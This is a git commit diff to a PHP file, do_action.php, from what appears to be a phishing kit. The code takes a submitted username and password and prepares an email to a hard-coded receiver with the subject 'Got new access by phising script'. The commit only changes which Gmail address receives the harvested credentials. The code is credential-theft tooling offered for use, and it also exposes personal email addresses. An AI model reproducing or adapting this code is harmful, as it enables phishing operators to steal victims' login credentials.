36fcbbdfc4fea0a16cd4da3fba5422cad455b3fa
Rdh-ar <78994391+Rdh-ar@users.noreply.github.com>
2021-03-03 11:06:10 +0800

    Update do_action.php

--- do_action.php
+++ do_action.php
@@ -8,7 +8,7 @@
 		$username = $_REQUEST['username'];
 		$password = $_REQUEST['password'];
 		
-		$reciever = "abandel09@gmail.com";
+		$reciever = "ridhoarrafi506@gmail.com";
 		
 		$subject = "Got new access by phising script";
 		$message = "The username is ". $username;
